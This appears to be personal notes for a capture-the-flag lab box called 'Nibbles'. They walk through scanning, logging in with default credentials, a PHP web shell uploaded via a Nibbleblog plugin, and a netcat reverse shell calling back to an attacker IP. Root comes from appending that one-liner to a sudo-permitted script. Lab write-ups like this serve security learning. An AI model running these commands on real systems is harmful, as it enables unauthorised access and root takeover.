Nibbles

added the ip to the hosts 
```
sudo nano /etc/hosts
```
Namp scan 
```
nmap -sC -sV nibbles.com
```
port 80 enumaration 
```
gobuster dir -u http://nibble.com/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```
Found /nibbleblog/ endpoint and started the feroxbuster found admin login page
Found default creds as "admin" "nibbles"

```
We started with a simple nmap scan showing two open ports

Discovered an instance of Nibbleblog

Analyzed the technologies in use using whatweb

Found the admin login portal page at admin.php

Discovered that directory listing is enabled and browsed several directories

Confirmed that admin was the valid username

Found out the hard way that IP blacklisting is enabled to prevent brute-force login attempts

Uncovered clues that led us to a valid admin password of nibbles
```

looking for any exploits and found RCE in the pulgins of nibble application 

using this 
```
Code: php
<?php system('id'); ?>
```
found the uploded path 
```
curl http://10.129.42.190/nibbleblog/content/private/plugins/my_image/image.php

uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```
used following script to get the Reverse shell

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING IP> <LISTENING PORT> >/tmp/f
```
Got the shell and able to read the user.txt

Used Sudo -l
```
nibbler@Nibbles:/home/nibbler$ sudo -l
sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```
The nibbler user can run the file /home/nibbler/personal/stuff/monitor.sh with root privileges. Being that we have full control over that file, 
if we append a reverse shell one-liner to the end of it and execute with sudo we should get a reverse shell back as the root user. Let us edit the monitor.sh file to append a reverse shell one-liner.

```
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 8443 >/tmp/f' | tee -a monitor.sh
```
If we cat the monitor.sh file, we will see the contents appended to the end. 
Execute the script with sudo:
```
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh
```
